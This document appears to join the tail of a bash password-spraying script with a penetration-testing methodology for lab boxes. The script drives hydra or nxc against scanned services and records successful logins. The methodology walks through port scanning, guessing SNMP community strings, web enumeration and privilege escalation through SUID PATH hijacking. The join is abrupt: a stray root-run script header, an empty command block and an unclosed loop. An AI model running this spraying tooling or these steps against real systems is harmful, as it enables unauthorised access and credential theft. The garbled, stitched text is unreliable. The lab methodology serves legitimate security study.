    printf '\n##### round %d/%d #####\n' "$rounds" "$(wc -l < "$PASS_NORM")" >> "$log"

    local out
    if [[ $tool == hydra ]]; then
      out=$(run_hydra "$proto" "$ip" "$port" "$pw"); rc=$?
    else
      out=$(run_nxc "$proto" "$ip" "$port" "$pw"); rc=$?
    fi
    printf '%s\n' "$out" >> "$log"

    # evidence that the sprayer really attempted logins this round
    if [[ $tool == hydra ]]; then
      grep -q 'login tries' <<<"$out" && evidence=$((evidence + 1))
    else
      grep -qE '\[[+-]\] ' <<<"$out" && evidence=$((evidence + 1))
    fi
    (( rc != 0 )) && { errors=$((errors + 1));
      printf '%s\t%s\t%s\trc=%s round=%s\n' "$proto" "$ip" "$port" "$rc" "$rounds" >> "$ERRORS"; }

    # collect successful logins
    while IFS= read -r line; do
      [[ -n $line ]] || continue
      printf '%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "$line" >> "$HITS"
      ok "  HIT  $proto $ip:$port  $line"
      hits=$((hits + 1))
    done < <(grep -F 'login:' <<<"$out" | sed 's/^[[:space:]]*//')
  done < "$PASS_NORM"

  local verdict
  if   (( hits > 0 ));        then verdict="HIT"
  elif (( evidence == 0 ));   then verdict="INCONCLUSIVE"
  elif (( errors >= rounds )); then verdict="INCONCLUSIVE"
  elif (( errors > 0 ));      then verdict="PARTIAL"
  else                             verdict="CLEAN"
  fi
  printf '%s\t%s\t%s\t%s\t%s/%s rounds, %s hit(s), %s evidence round(s), %s error(s)\n' \
    "$proto" "$ip" "$port" "$verdict" "$rounds" "$rounds" "$hits" "$evidence" "$errors" >> "$VERDICTS"

  case "$verdict" in
    HIT)          ok "  $proto $ip:$port -> HIT ($hits credential pair(s))";;
    CLEAN)        sub "  $proto $ip:$port -> CLEAN (all $rounds round(s) really ran)";;
    PARTIAL)      warn "  $proto $ip:$port -> PARTIAL ($errors/$rounds round(s) errored, no hit) - see $log";;
    INCONCLUSIVE) warn "  $proto $ip:$port -> INCONCLUSIVE (see $log) - do NOT read this as 'no creds'";;
  esac
}

spray_all() {
  if (( DO_SPRAY == 0 )); then
    warn "spray skipped - users.txt or pass.txt is empty"
    return 0
  fi
  local count; count=$(wc -l < "$PLAN")
  if (( count == 0 )); then
    warn "nothing sprayable in the scan results"
    return 0
  fi
  hr
  msg "spray plan: $count service(s), $(wc -l < "$USERS_NORM") user(s) x $(wc -l < "$PASS_NORM") password(s)"
  local ip port proto
  while IFS="$TAB" read -r ip port proto; do
    [[ -n ${ip:-} ]] || continue
    spray_service "$proto" "$ip" "$port"
  done < "$PLAN"
}

## unblock_sshd_7f3a.sh
##
## Run as root ON the target (e.g. /home/cassie/rootbash -p -c 'bash unblock_sshd_7f3a.sh').

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p

feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q

  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.
